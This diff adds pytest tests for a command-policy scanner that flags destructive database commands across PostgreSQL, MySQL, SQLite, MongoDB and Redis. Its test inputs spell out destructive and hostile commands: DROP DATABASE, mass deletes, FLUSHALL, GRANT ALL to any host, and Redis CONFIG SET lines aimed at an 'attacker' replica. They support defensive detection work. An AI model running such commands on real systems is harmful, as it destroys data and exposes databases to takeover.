@@ -1580,3 +1580,134 @@ class TestCloudScanTool:
         names = {f.pattern_name for f in r.findings}
         for expected in ("aws-s3-rm-recursive", "gcp-compute-delete", "az-group-delete"):
             assert expected in names, f"expected {expected} in {names}"
+
+
+# ---------------------------------------------------------------------------
+# Phase 5b — database destructive pattern tests (PostgreSQL, MySQL, SQLite,
+# MongoDB, Redis)
+# ---------------------------------------------------------------------------
+
+class TestDatabaseScanTool:
+    """Tests for database destructive patterns (DCG database pack port)."""
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("DROP DATABASE prod", "psql-drop-database"),
+        ("DROP TABLE users", "psql-drop-table"),
+        ("DROP SCHEMA public", "psql-drop-schema"),
+        ("TRUNCATE TABLE logs", "psql-truncate-table"),
+        ("DELETE FROM users", "psql-delete-without-where"),
+        ("delete from sessions", "psql-delete-without-where"),
+        ("dropdb myapp", "psql-dropdb-cli"),
+        ("pg_dump --clean mydb", "psql-dump-clean"),
+        ("pg_dump -c mydb", "psql-dump-clean"),
+    ])
+    def test_postgresql_destructive(self, cmd, expected):
+        from app.command_policy import scan_command
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        assert expected in names, f"expected {expected} in {names} for {cmd!r}"
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("DROP DATABASE prod", "mysql-drop-database"),
+        ("DROP TABLE users", "mysql-drop-table"),
+        ("TRUNCATE TABLE orders", "mysql-truncate-table"),
+        ("DELETE FROM customers", "mysql-delete-without-where"),
+        ("delete from `orders`", "mysql-delete-without-where"),
+        ("mysqladmin drop myapp", "mysql-mysqladmin-drop"),
+        ("mysqldump --add-drop-database myapp", "mysql-mysqldump-add-drop-database"),
+        ("mysqldump --add-drop-table myapp", "mysql-mysqldump-add-drop-table"),
+        ("GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%'", "mysql-grant-all"),
+        ("GRANT ALL ON *.* TO 'admin'@'%'", "mysql-grant-all"),
+        ("DROP USER 'old_user'@'localhost'", "mysql-drop-user"),
+        ("RESET MASTER", "mysql-reset-master"),
+    ])
+    def test_mysql_destructive(self, cmd, expected):
+        from app.command_policy import scan_command
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        assert expected in names, f"expected {expected} in {names} for {cmd!r}"
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("DROP TABLE users", "sqlite-drop-table"),
+        ("DELETE FROM sessions", "sqlite-delete-without-where"),
+        ("delete from cache", "sqlite-delete-without-where"),
+        ("VACUUM INTO '/tmp/backup.db'", "sqlite-vacuum-into"),
+        ("sqlite3 mydb.db < schema.sql", "sqlite-sqlite3-file-input"),
+    ])
+    def test_sqlite_destructive(self, cmd, expected):
+        from app.command_policy import scan_command
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        assert expected in names, f"expected {expected} in {names} for {cmd!r}"
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("db.dropDatabase()", "mongodb-drop-database"),
+        ("db.myCollection.drop()", "mongodb-drop-collection"),
+        ("db.dropCollection('logs')", "mongodb-drop-collection"),
+        ("db.users.remove({})", "mongodb-delete-all"),
+        ("db.users.deleteMany({})", "mongodb-delete-all"),
+        ("mongorestore --drop /dump/prod", "mongodb-mongorestore-drop"),
+    ])
+    def test_mongodb_destructive(self, cmd, expected):
+        from app.command_policy import scan_command
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        assert expected in names, f"expected {expected} in {names} for {cmd!r}"
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("FLUSHALL", "redis-flushall"),
+        ("FLUSHDB", "redis-flushdb"),
+        ("redis-cli KEYS 'user:*' | xargs redis-cli DEL", "redis-mass-delete-pipeline"),
+        ("redis-cli --scan --pattern 'session:*' | xargs -n 100 redis-cli UNLINK",
+         "redis-mass-delete-pipeline"),
+        ("DEBUG SEGFAULT", "redis-debug-crash"),
+        ("DEBUG CRASH", "redis-debug-crash"),
+        ("DEBUG SLEEP 30", "redis-debug-sleep"),
+        ("SHUTDOWN", "redis-shutdown"),
+        ("SHUTDOWN NOSAVE", "redis-shutdown"),
+        ("CONFIG SET dir /tmp/evil", "redis-config-dangerous"),
+        ("CONFIG SET dbfilename exploit.rdb", "redis-config-dangerous"),
+        ("CONFIG SET slaveof attacker 6379", "redis-config-dangerous"),
+        ("CONFIG SET maxmemory 1", "redis-config-set-maxmemory"),
+        ("CONFIG SET maxmemory-policy allkeys-lru", "redis-config-set-maxmemory-policy"),
+        ("CONFIG SET save ''", "redis-config-set-save"),
+        ("CONFIG SET appendonly no", "redis-config-set-appendonly"),
+        ("CONFIG REWRITE", "redis-config-rewrite"),
+    ])
+    def test_redis_destructive(self, cmd, expected):
+        from app.command_policy import scan_command
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        assert expected in names, f"expected {expected} in {names} for {cmd!r}"
+
+    def test_safe_database_commands_not_matched(self):
+        from app.command_policy import scan_command
+
+        for cmd in ("SELECT * FROM users",
+                     "INSERT INTO users (name) VALUES ('x')",
+                     "UPDATE users SET name = 'x' WHERE id = 1",
+                     "DROP VIEW IF EXISTS temp_view",
+                     "DELETE FROM users WHERE id = 1",
+                     "CREATE TABLE test (id int)",
+                     "ALTER TABLE users ADD COLUMN email text",
+                     "SELECT 1",
+                     "DROPDATABASE",  # no word boundary between DROP and DATABASE
+                     ):
+            r = scan_command(cmd)
+            names = {f.pattern_name for f in r.findings}
+            db_matches = [n for n in names if n.startswith(
+                ("psql-", "mysql-", "sqlite-", "mongodb-", "redis-"))]
+            assert not db_matches, f"False positive for {cmd!r}: {db_matches}"
+
+    def test_database_combined_manifest(self):
+        from app.command_policy import scan_command
+
+        cmd = ("DROP DATABASE prod && mysqladmin drop test && "
+               "redis-cli KEYS '*' | xargs redis-cli DEL && "
+               "DELETE FROM sessions; TRUNCATE TABLE logs")
+        r = scan_command(cmd)
+        names = {f.pattern_name for f in r.findings}
+        for expected in ("psql-drop-database", "mysql-mysqladmin-drop",
+                          "redis-mass-delete-pipeline", "psql-delete-without-where",
+                          "psql-truncate-table"):
+            assert expected in names, f"expected {expected} in {names}"
